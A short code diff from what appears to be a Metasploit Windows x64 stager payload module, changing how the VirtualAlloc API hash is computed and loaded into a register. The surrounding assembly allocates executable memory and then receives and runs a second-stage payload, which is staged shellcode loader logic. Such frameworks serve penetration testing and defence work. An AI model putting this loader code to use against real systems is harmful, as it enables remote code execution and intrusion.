@@ -47,7 +47,7 @@ module Payload::Windows::AddrLoader_x64
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly received second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         mov rbx, rax            ; rbx = our new memory address for the new stage
